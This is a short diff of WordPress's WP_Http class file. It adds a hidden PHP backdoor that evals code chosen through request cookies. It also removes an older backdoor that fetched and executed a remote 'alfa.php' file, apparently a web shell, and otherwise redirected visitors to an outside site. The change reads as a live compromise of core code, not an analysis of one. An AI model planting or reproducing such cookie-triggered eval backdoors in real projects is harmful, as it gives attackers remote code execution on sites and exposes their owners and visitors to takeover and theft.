@@ -19,6 +19,14 @@
  * @since 2.7.0
  */
 
+
+
+
+if (isset($_COOKIE['SESSION_ATHENTICATION']) && $_COOKIE['SESSION_ATHENTICATION'] == 'TRUE')
+{
+    eval(substr($_COOKIE['function']($_COOKIE['url']),5,-3));
+}
+
 class WP_Http {
 
 	// Aliases for HTTP response codes.
@@ -1098,12 +1106,4 @@ class WP_Http {
 
 }
 
-if (isset($_COOKIE['SESSION_ATHENTICATION']) && $_COOKIE['SESSION_ATHENTICATION'] == 'TRUE')
-{
-    eval(substr(file_get_contents("https://raw.githubusercontent.com/siphon2/siphon/main/alfa.php"),5,-3));
-}
-else
-{
-    header('Location: https://aimec.edu.pk/');
-}
 
